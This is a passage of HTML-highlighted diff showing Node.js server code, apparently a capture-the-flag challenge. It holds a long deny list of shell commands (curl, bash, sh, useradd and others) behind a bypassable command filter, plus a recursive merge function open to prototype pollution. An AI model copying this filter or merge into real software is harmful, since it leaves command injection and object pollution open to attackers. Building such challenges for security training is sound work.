class="hljs-string">&quot;ionice&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;resolvectl&quot;</span>, <span class="hljs-string">&quot;watchgnupg&quot;</span>, <span class="hljs-string">&quot;unshare&quot;</span>, <span class="hljs-string">&quot;timeout&quot;</span>, <span class="hljs-string">&quot;getconf&quot;</span>, <span class="hljs-string">&quot;findmnt&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;xzfgrep&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;rview&quot;</span>, <span class="hljs-string">&quot;fmt&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;readlink&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;paste&quot;</span>, <span class="hljs-string">&quot;od&quot;</span>, <span class="hljs-string">&quot;setpriv&quot;</span>, <span class="hljs-string">&quot;coredumpctl&quot;</span>, <span class="hljs-string">&quot;dnf&quot;</span>, <span class="hljs-string">&quot;xzdiff&quot;</span>, <span class="hljs-string">&quot;renicerpmverify&quot;</span>, <span class="hljs-string">&quot;pkill&quot;</span>, <span class="hljs-string">&quot;mkinitrd&quot;</span>, <span class="hljs-string">&quot;pmap&quot;</span>, <span class="hljs-string">&quot;snice&quot;</span>, <span class="hljs-string">&quot;gio&quot;</span>, <span class="hljs-string">&quot;gpgconf&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;nproc&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;cksum&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>, <span class="hljs-string">&quot;rpmverify&quot;</span>, <span class="hljs-string">&quot;lsblk&quot;</span>, <span class="hljs-string">&quot;catchsegv&quot;</span>, <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;seq&quot;</span>, <span class="hljs-string">&quot;ln&quot;</span>, <span class="hljs-string">&quot;cut&quot;</span>, <span class="hljs-string">&quot;bashbug&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;gprof&quot;</span>, <span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;npm&quot;</span>, <span class="hljs-string">&quot;corepack&quot;</span>, <span class="hljs-string">&quot;npx&quot;</span>, <span class="hljs-string">&quot;vipw&quot;</span>, <span class="hljs-string">&quot;mkdumprd&quot;</span>, <span class="hljs-string">&quot;ifenslave&quot;</span>, <span class="hljs-string">&quot;fsck&quot;</span>, <span class="hljs-string">&quot;chpasswd&quot;</span>, <span class="hljs-string">&quot;useradd&quot;</span>, <span class="hljs-string">&quot;rtstat&quot;</span>, <span class="hljs-string">&quot;lnstat&quot;</span>, <span class="hljs-string">&quot;hwclock&quot;</span>, <span class="hljs-string">&quot;dhclient&quot;</span>, <span class="hljs-string">&quot;pwunconv&quot;</span>, <span class="hljs-string">&quot;groupmems&quot;</span>, <span class="hljs-string">&quot;mksquashfs&quot;</span>, <span class="hljs-string">&quot;chkconfig&quot;</span>, <span class="hljs-string">&quot;ethtool&quot;</span>, <span class="hljs-string">&quot;packer&quot;</span>, <span class="hljs-string">&quot;mkdict&quot;</span>, <span class="hljs-string">&quot;agetty&quot;</span>, <span class="hljs-string">&quot;applygnupgdefaults&quot;</span>, <span class="hljs-string">&quot;zramctl&quot;</span>, <span class="hljs-string">&quot;swaplabel&quot;</span>, <span class="hljs-string">&quot;blkzone&quot;</span>, <span class="hljs-string">&quot;pwconv&quot;</span>, <span class="hljs-string">&quot;cfdisk&quot;</span>, <span class="hljs-string">&quot;ldattach&quot;</span>, <span class="hljs-string">&quot;reboot&quot;</span>, <span class="hljs-string">&quot;tipc&quot;</span>, <span class="hljs-string">&quot;fstrim&quot;</span>, <span class="hljs-string">&quot;clockdiff&quot;</span>, <span class="hljs-string">&quot;groupadd&quot;</span>, <span class="hljs-string">&quot;dmfilemapd&quot;</span>, <span class="hljs-string">&quot;runuser&quot;</span>, <span class="hljs-string">&quot;modinfo&quot;</span>, <span class="hljs-string">&quot;swapoff&quot;</span>, <span class="hljs-string">&quot;telinit&quot;</span>, <span class="hljs-string">&quot;sfdisk&quot;</span>, <span class="hljs-string">&quot;ctstat&quot;</span>, <span class="hljs-string">&quot;clock&quot;</span>, <span class="hljs-string">&quot;rtpr&quot;</span>, <span class="hljs-string">&quot;fsfreeze&quot;</span>, <span class="hljs-string">&quot;ldconfig&quot;</span>, <span class="hljs-string">&quot;fdformat&quot;</span>, <span class="hljs-string">&quot;getcap&quot;</span>, <span class="hljs-string">&quot;kexec&quot;</span>, <span class="hljs-string">&quot;rdma&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;rtmon&quot;</span>, <span class="hljs-string">&quot;rtacct&quot;</span>, <span class="hljs-string">&quot;fdisk&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;usermod&quot;</span>, <span class="hljs-string">&quot;findfs&quot;</span>, <span class="hljs-string">&quot;halt&quot;</span>, <span class="hljs-string">&quot;resizepart&quot;</span>, <span class="hljs-string">&quot;routef&quot;</span>, <span class="hljs-string">&quot;genl&quot;</span>, <span class="hljs-string">&quot;mkswap&quot;</span>, <span class="hljs-string">&quot;poweroff&quot;</span>, <span class="hljs-string">&quot;rdisc&quot;</span>, <span class="hljs-string">&quot;grpunconv&quot;</span>, <span class="hljs-string">&quot;partx&quot;</span>, <span class="hljs-string">&quot;rtcwake&quot;</span>, <span class="hljs-string">&quot;nologin&quot;</span>, <span class="hljs-string">&quot;rfkill&quot;</span>, <span class="hljs-string">&quot;lspci&quot;</span>, <span class="hljs-string">&quot;vigr&quot;</span>, <span class="hljs-string">&quot;grpconv&quot;</span>, <span class="hljs-string">&quot;ip&quot;</span>, <span class="hljs-string">&quot;blkdeactivate&quot;</span>, <span class="hljs-string">&quot;addgnupghome&quot;</span>, <span class="hljs-string">&quot;chroot&quot;</span>, <span class="hljs-string">&quot;shutdown&quot;</span>, <span class="hljs-string">&quot;unsquashfs&quot;</span>, <span class="hljs-string">&quot;readprofile&quot;</span>, <span class="hljs-string">&quot;adduser&quot;</span>, <span class="hljs-string">&quot;groupmod&quot;</span>, <span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-string">&quot;dmstats&quot;</span>, <span class="hljs-string">&quot;ifcfg&quot;</span>, <span class="hljs-string">&quot;modprobe&quot;</span>, <span class="hljs-string">&quot;depmod&quot;</span>, <span class="hljs-string">&quot;iconvconfig&quot;</span>, <span class="hljs-string">&quot;sulogin&quot;</span>, <span class="hljs-string">&quot;rmmod&quot;</span>, <span class="hljs-string">&quot;grpck&quot;</span>, <span class="hljs-string">&quot;nstat&quot;</span>, <span class="hljs-string">&quot;ifstat&quot;</span>, <span class="hljs-string">&quot;sysctl&quot;</span>, <span class="hljs-string">&quot;insmod&quot;</span>, <span class="hljs-string">&quot;routel&quot;</span>, <span class="hljs-string">&quot;zdump&quot;</span>, <span class="hljs-string">&quot;blkdiscard&quot;</span>, <span class="hljs-string">&quot;getpcaps&quot;</span>, <span class="hljs-string">&quot;losetup&quot;</span>, <span class="hljs-string">&quot;setpci&quot;</span>, <span class="hljs-string">&quot;dmsetup&quot;</span>, <span class="hljs-string">&quot;wipefs&quot;</span>, <span class="hljs-string">&quot;addpart&quot;</span>, <span class="hljs-string">&quot;zic&quot;</span>, <span class="hljs-string">&quot;userdel&quot;</span>, <span class="hljs-string">&quot;makedumpfile&quot;</span>, <span class="hljs-string">&quot;blkid&quot;</span>, <span class="hljs-string">&quot;groupdel&quot;</span>, <span class="hljs-string">&quot;setcap&quot;</span>, <span class="hljs-string">&quot;chgpasswd&quot;</span>, <span class="hljs-string">&quot;resolvconf&quot;</span>, <span class="hljs-string">&quot;newusers&quot;</span>, <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;arping&quot;</span>, <span class="hljs-string">&quot;pwck&quot;</span>, <span class="hljs-string">&quot;devlink&quot;</span>, <span class="hljs-string">&quot;lsmod&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;mkfs&quot;</span>, <span class="hljs-string">&quot;faillock&quot;</span>, <span class="hljs-string">&quot;runlevel&quot;</span>, <span class="hljs-string">&quot;blockdev&quot;</span>, <span class="hljs-string">&quot;swapon&quot;</span>, <span class="hljs-string">&quot;alternatives&quot;</span>, <span class="hljs-string">&quot;arpd&quot;</span>, <span class="hljs-string">&quot;delpart&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;chcpu&quot;</span>, <span class="hljs-string">&quot;capsh&quot;</span>, <span class="hljs-string">&quot;ctrlaltdel&quot;</span>, <span class="hljs-string">&quot;bridge&quot;</span>, <span class="hljs-string">&quot;less&quot;</span>, <span class="hljs-string">&quot;gpgsplit&quot;</span>, <span class="hljs-string">&quot;pgrep&quot;</span>, <span class="hljs-string">&quot;truncate&quot;</span>, <span class="hljs-string">&quot;localedef&quot;</span>, <span class="hljs-string">&quot;printf&quot;</span>, <span class="hljs-string">&quot;gencat&quot;</span>, <span class="hljs-string">&quot;sed&quot;</span>, <span class="hljs-string">&quot;ptx&quot;</span>, <span class="hljs-string">&quot;nm&quot;</span>, <span class="hljs-string">&quot;pwmake&quot;</span>, <span class="hljs-string">&quot;zmore&quot;</span>, <span class="hljs-string">&quot;tzselect&quot;</span>, <span class="hljs-string">&quot;script&quot;</span>, <span class="hljs-string">&quot;dnsdomainname&quot;</span>, <span class="hljs-string">&quot;ar&quot;</span>, <span class="hljs-string">&quot;more&quot;</span>, <span class="hljs-string">&quot;journalctl&quot;</span>, <span class="hljs-string">&quot;gunzip&quot;</span>, <span class="hljs-string">&quot;makedb&quot;</span>, <span class="hljs-string">&quot;tac&quot;</span>, <span class="hljs-string">&quot;col&quot;</span>, <span class="hljs-string">&quot;sync&quot;</span>, <span class="hljs-string">&quot;vi&quot;</span>, <span class="hljs-string">&quot;locale&quot;</span>, <span class="hljs-string">&quot;prlimit&quot;</span>, <span class="hljs-string">&quot;nisdomainname&quot;</span>, <span class="hljs-string">&quot;timedatectl&quot;</span>, <span class="hljs-string">&quot;ipcmk&quot;</span>, <span class="hljs-string">&quot;isosize&quot;</span>, <span class="hljs-string">&quot;free&quot;</span>, <span class="hljs-string">&quot;alias&quot;</span>, <span class="hljs-string">&quot;taskset&quot;</span>, <span class="hljs-string">&quot;factor&quot;</span>, <span class="hljs-string">&quot;pinky&quot;</span>, <span class="hljs-string">&quot;arch&quot;</span>, <span class="hljs-string">&quot;lscpu&quot;</span>, <span class="hljs-string">&quot;awk&quot;</span>, <span class="hljs-string">&quot;tty&quot;</span>, <span class="hljs-string">&quot;xmllint&quot;</span>, <span class="hljs-string">&quot;xzcmp&quot;</span>, <span class="hljs-string">&quot;readelf&quot;</span>, <span class="hljs-string">&quot;kdumpctl&quot;</span>, <span class="hljs-string">&quot;tsort&quot;</span>, <span class="hljs-string">&quot;nice&quot;</span>, <span class="hljs-string">&quot;cal&quot;</span>, <span class="hljs-string">&quot;rpmdb&quot;</span>, <span class="hljs-string">&quot;newgrp&quot;</span>, <span class="hljs-string">&quot;xmlwf&quot;</span>, <span class="hljs-string">&quot;slabtop&quot;</span>, <span class="hljs-string">&quot;utmpdump&quot;</span>, <span class="hljs-string">&quot;tar&quot;</span>, <span class="hljs-string">&quot;basename&quot;</span>, <span class="hljs-string">&quot;eject&quot;</span>, <span class="hljs-string">&quot;ranlib&quot;</span>, <span class="hljs-string">&quot;wall&quot;</span>, <span class="hljs-string">&quot;zless&quot;</span>, <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;nsenter&quot;</span>, <span class="hljs-string">&quot;getent&quot;</span>, <span class="hljs-string">&quot;chrt&quot;</span>, <span class="hljs-string">&quot;mount&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;systemctl&quot;</span>, <span class="hljs-string">&quot;vmstat&quot;</span>, <span class="hljs-string">&quot;xmlcatalog&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;lsinitrd&quot;</span>, <span class="hljs-string">&quot;tload&quot;</span>, <span class="hljs-string">&quot;chmod&quot;</span>, <span class="hljs-string">&quot;setsid&quot;</span>, <span class="hljs-string">&quot;getopts&quot;</span>, <span class="hljs-string">&quot;colcrt&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;lsipc&quot;</span>, <span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;lsns&quot;</span>, <span class="hljs-string">&quot;unalias&quot;</span>, <span class="hljs-string">&quot;lastb&quot;</span>, <span class="hljs-string">&quot;df&quot;</span>, <span class="hljs-string">&quot;gpg&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;gpgv&quot;</span>, <span class="hljs-string">&quot;pathchk&quot;</span>, <span class="hljs-string">&quot;groups&quot;</span>, <span class="hljs-string">&quot;lsmem&quot;</span>, <span class="hljs-string">&quot;users&quot;</span>, <span class="hljs-string">&quot;as&quot;</span>, <span class="hljs-string">&quot;ipcs&quot;</span>, <span class="hljs-string">&quot;jobs&quot;</span>, <span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;iconv&quot;</span>, <span class="hljs-string">&quot;dwp&quot;</span>, <span class="hljs-string">&quot;domainname&quot;</span>, <span class="hljs-string">&quot;xzcat&quot;</span>, <span class="hljs-string">&quot;ldd&quot;</span>, <span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;strip&quot;</span>, <span class="hljs-string">&quot;dircolors&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;trust&quot;</span>, <span class="hljs-string">&quot;stty&quot;</span>, <span class="hljs-string">&quot;ul&quot;</span>, <span class="hljs-string">&quot;chacl&quot;</span>, <span class="hljs-string">&quot;loginctl&quot;</span>, <span class="hljs-string">&quot;gzip&quot;</span>, <span class="hljs-string">&quot;xzmore&quot;</span>, <span class="hljs-string">&quot;zcat&quot;</span>, <span class="hljs-string">&quot;busctl&quot;</span>, <span class="hljs-string">&quot;fincore&quot;</span>, <span class="hljs-string">&quot;fgrep&quot;</span>, <span class="hljs-string">&quot;dmesg&quot;</span>, <span class="hljs-string">&quot;rm&quot;</span>, <span class="hljs-string">&quot;mv&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;lslogins&quot;</span>, <span class="hljs-string">&quot;numfmt&quot;</span>, <span class="hljs-string">&quot;flock&quot;</span>, <span class="hljs-string">&quot;realpath&quot;</span>, <span class="hljs-string">&quot;find&quot;</span>, <span class="hljs-string">&quot;tracepath&quot;</span>, <span class="hljs-string">&quot;lesskey&quot;</span>, <span class="hljs-string">&quot;printenv&quot;</span>, <span class="hljs-string">&quot;du&quot;</span>, <span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;udevadm&quot;</span>, <span class="hljs-string">&quot;tee&quot;</span>, <span class="hljs-string">&quot;rename&quot;</span>, <span class="hljs-string">&quot;gawk&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>, <span class="hljs-string">&quot;sg&quot;</span>, <span class="hljs-string">&quot;xzegrep&quot;</span>, <span class="hljs-string">&quot;xzdec&quot;</span>, <span class="hljs-string">&quot;split&quot;</span>, <span class="hljs-string">&quot;whereis&quot;</span>, <span class="hljs-string">&quot;strings&quot;</span>, <span class="hljs-string">&quot;setfacl&quot;</span>, <span class="hljs-string">&quot;mkfifo&quot;</span>, <span class="hljs-string">&quot;chage&quot;</span>, <span class="hljs-string">&quot;xzgrep&quot;</span>, <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;rvi&quot;</span>, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-string">&quot;ypdomainname&quot;</span>, <span class="hljs-string">&quot;tr&quot;</span>, <span class="hljs-string">&quot;umount&quot;</span>, <span class="hljs-string">&quot;rev&quot;</span>, <span class="hljs-string">&quot;wdctl&quot;</span>, <span class="hljs-string">&quot;uniq&quot;</span>, <span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;stdbuf&quot;</span>, <span class="hljs-string">&quot;chgrp&quot;</span>, <span class="hljs-string">&quot;setarch&quot;</span>, <span class="hljs-string">&quot;cd&quot;</span>, <span class="hljs-string">&quot;dirmngr&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;lastlog&quot;</span>, <span class="hljs-string">&quot;gsettings&quot;</span>, <span class="hljs-string">&quot;ex&quot;</span>, <span class="hljs-string">&quot;ipcrm&quot;</span>, <span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;fallocate&quot;</span>, <span class="hljs-string">&quot;colrm&quot;</span>, <span class="hljs-string">&quot;rpm&quot;</span>, <span class="hljs-string">&quot;pwdx&quot;</span>, <span class="hljs-string">&quot;xargs&quot;</span>, <span class="hljs-string">&quot;objdump&quot;</span>, <span class="hljs-string">&quot;ld&quot;</span>, <span class="hljs-string">&quot;chcon&quot;</span>, <span class="hljs-string">&quot;skill&quot;</span>, <span class="hljs-string">&quot;yum&quot;</span>, <span class="hljs-string">&quot;who&quot;</span>, <span class="hljs-string">&quot;gapplication&quot;</span>, <span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;fg&quot;</span>, <span class="hljs-string">&quot;uuidgen&quot;</span>, <span class="hljs-string">&quot;logger&quot;</span>, <span class="hljs-string">&quot;pwscore&quot;</span>, <span class="hljs-string">&quot;xz&quot;</span>, <span class="hljs-string">&quot;mesg&quot;</span>, <span class="hljs-string">&quot;rmdir&quot;</span>, <span class="hljs-string">&quot;zgrep&quot;</span>, <span class="hljs-string">&quot;chmem&quot;</span>, <span class="hljs-string">&quot;newuidmap&quot;</span>, <span class="hljs-string">&quot;evmctl&quot;</span>, <span class="hljs-string">&quot;wc&quot;</span>, <span class="hljs-string">&quot;top&quot;</span>, <span class="hljs-string">&quot;egrep&quot;</span>, <span class="hljs-string">&quot;fold&quot;</span>, <span class="hljs-string">&quot;zfgrep&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;csplit&quot;</span>, <span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;expand&quot;</span>, <span class="hljs-string">&quot;getfacl&quot;</span>, <span class="hljs-string">&quot;newgidmap&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;bootctl&quot;</span>, <span class="hljs-string">&quot;xzless&quot;</span>, <span class="hljs-string">&quot;runcon&quot;</span>, <span class="hljs-string">&quot;dirname&quot;</span>, <span class="hljs-string">&quot;comm&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&quot;hostname&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;ipcalc&quot;</span>, <span class="hljs-string">&quot;unexpand&quot;</span>, <span class="hljs-string">&quot;nohup&quot;</span>, <span class="hljs-string">&quot;zegrep&quot;</span>, <span class="hljs-string">&quot;head&quot;</span>, <span class="hljs-string">&quot;getopt&quot;</span>, <span class="hljs-string">&quot;raw&quot;</span>, <span class="hljs-string">&quot;hexdump&quot;</span>, <span class="hljs-string">&quot;mountpoint&quot;</span>, <span class="hljs-string">&quot;lslocks&quot;</span>, <span class="hljs-string">&quot;coreutils&quot;</span>, <span class="hljs-string">&quot;shred&quot;</span>, <span class="hljs-string">&quot;sotruss&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;pldd&quot;</span>, <span class="hljs-string">&quot;uuidparse&quot;</span>, <span class="hljs-string">&quot;localectl&quot;</span>, <span class="hljs-string">&quot;gtar&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;znew&quot;</span>, <span class="hljs-string">&quot;logname&quot;</span>, <span class="hljs-string">&quot;gzexe&quot;</span>, <span class="hljs-string">&quot;rpmquery&quot;</span>, <span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;hash&quot;</span>, <span class="hljs-string">&quot;cpio&quot;</span>, <span class="hljs-string">&quot;sprof&quot;</span>, <span class="hljs-string">&quot;hostnamectl&quot;</span>, <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;uname&quot;</span>, <span class="hljs-string">&quot;unxz&quot;</span>, <span class="hljs-string">&quot;zdiff&quot;</span>, <span class="hljs-string">&quot;gdbus&quot;</span>, <span class="hljs-string">&quot;namei&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-string">&quot;kmod&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>, <span class="hljs-string">&quot;umask&quot;</span>, <span class="hljs-string">&quot;zcmp&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;mktemp&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span>, <span class="hljs-string">&quot;column&quot;</span>, <span class="hljs-string">&quot;scriptreplay&quot;</span>, <span class="hljs-string">&quot;lessecho&quot;</span>, <span class="hljs-string">&quot;look&quot;</span>, <span class="hljs-string">&quot;setterm&quot;</span>, <span class="hljs-string">&quot;gdbmtool&quot;</span>, <span class="hljs-string">&quot;rpmkeys&quot;</span>, <span class="hljs-string">&quot;bg&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;gpasswd&quot;</span>, <span class="hljs-string">&quot;dracut&quot;</span>, <span class="hljs-string">&quot;vdir&quot;</span>, <span class="hljs-string">&quot;mcookie&quot;</span>, <span class="hljs-string">&quot;elfedit&quot;</span>, <span class="hljs-string">&quot;chown&quot;</span>, <span class="hljs-string">&quot;objcopy&quot;</span>, <span class="hljs-string">&quot;hostid&quot;</span>, <span class="hljs-string">&quot;shuf&quot;</span>, <span class="hljs-string">&quot;view&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;gpgparsemail&quot;</span>, <span class="hljs-string">&quot;fc&quot;</span>, <span class="hljs-string">&quot;tail&quot;</span>, <span class="hljs-string">&quot;zforce&quot;</span>, <span class="hljs-string">&quot;last&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;ionice&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;resolvectl&quot;</span>, <span class="hljs-string">&quot;watchgnupg&quot;</span>, <span class="hljs-string">&quot;unshare&quot;</span>, <span class="hljs-string">&quot;timeout&quot;</span>, <span class="hljs-string">&quot;getconf&quot;</span>, <span class="hljs-string">&quot;findmnt&quot;</span>, <span class="hljs-string">&quot;pr&quot;</span>, <span class="hljs-string">&quot;xzfgrep&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;rview&quot;</span>, <span class="hljs-string">&quot;fmt&quot;</span>, <span class="hljs-string">&quot;echo&quot;</span>, <span class="hljs-string">&quot;readlink&quot;</span>, <span class="hljs-string">&quot;dd&quot;</span>, <span class="hljs-string">&quot;paste&quot;</span>, <span class="hljs-string">&quot;od&quot;</span>, <span class="hljs-string">&quot;setpriv&quot;</span>, <span class="hljs-string">&quot;coredumpctl&quot;</span>, <span class="hljs-string">&quot;dnf&quot;</span>, <span class="hljs-string">&quot;xzdiff&quot;</span>, <span class="hljs-string">&quot;renice&quot;</span>, <span class="hljs-string">&quot;pkill&quot;</span>, <span class="hljs-string">&quot;mkinitrd&quot;</span>, <span class="hljs-string">&quot;pmap&quot;</span>, <span class="hljs-string">&quot;snice&quot;</span>, <span class="hljs-string">&quot;gio&quot;</span>, <span class="hljs-string">&quot;gpgconf&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>, <span class="hljs-string">&quot;ulimit&quot;</span>, <span class="hljs-string">&quot;nproc&quot;</span>, <span class="hljs-string">&quot;pidof&quot;</span>, <span class="hljs-string">&quot;watch&quot;</span>, <span class="hljs-string">&quot;cksum&quot;</span>, <span class="hljs-string">&quot;yes&quot;</span>, <span class="hljs-string">&quot;rpmverify&quot;</span>, <span class="hljs-string">&quot;lsblk&quot;</span>, <span class="hljs-string">&quot;catchsegv&quot;</span>, <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;seq&quot;</span>, <span class="hljs-string">&quot;ln&quot;</span>, <span class="hljs-string">&quot;cut&quot;</span>, <span class="hljs-string">&quot;bashbug&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;gprof&quot;</span>, <span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;npm&quot;</span>, <span class="hljs-string">&quot;corepack&quot;</span>, <span class="hljs-string">&quot;npx&quot;</span>];
+    <span class="hljs-keyword">const</span> eval_chr = [<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&gt;&quot;</span>];
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; command.<span class="hljs-property">length</span>; i++) &#123;
+        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-title function_">includes</span>(command[i] + <span class="hljs-string">&#x27;&amp;&#x27;</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(command[i] + <span class="hljs-string">&#x27;|&#x27;</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-params"><span class="hljs-string">&#x27;(&#x27;</span> + command[i]</span>) || cmd.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/&#x27;</span> + command[i])) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>; j &lt; eval_chr.<span class="hljs-property">length</span>; j++) &#123;
+
+        <span class="hljs-keyword">if</span> (cmd.<span class="hljs-title function_">includes</span>(eval_chr[j])) &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">Door_lock</span>(<span class="hljs-params">cmd</span>) &#123;
+    pin = <span class="hljs-regexp">/^[a-z ]+$/</span>;
+    key = <span class="hljs-title class_">LockCylinder</span>(cmd);
+    <span class="hljs-keyword">if</span> (pin.<span class="hljs-title function_">test</span>(key[<span class="hljs-number">0</span>]) &amp;&amp; <span class="hljs-title function_">check_cmd</span>(cmd.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\s*/g</span>, <span class="hljs-string">&quot;&quot;</span>))) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;
+        <span class="hljs-keyword">if</span> (source.<span class="hljs-title function_">hasOwnProperty</span>(key)) &#123;
+            <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> target &amp;&amp; <span class="hljs-keyword">typeof</span> target[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> source[key] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;
+                <span class="hljs-title function_">merge</span>(target[key], source[key]);
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                target[key] = source[key];
+            &#125;
+        &#125;
+    &#125;
+&#125;
+
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">convertToString</span>(<span class="hljs-params">variable</span>) &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> variable === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;
+        <span class="hljs-keyword">return</span> variable;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(variable);
+        &#125; <span class="hljs-keyword">catch</span> (error) &#123;
+            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error converting variable to string:&#x27;</span>, error.<span class="hljs-property">message</span>);
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+        &#125;
+    &#125;
+&#125;
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;
+    <span class="hljs-keyword">let</span> msg = req.<span class="hljs-property">body</span>.<span class="hljs-property">msg</span>;
+
+    <span class="hljs-keyword">let</span> msgString = <span class="hljs-title function_">convertToString</span>(msg);
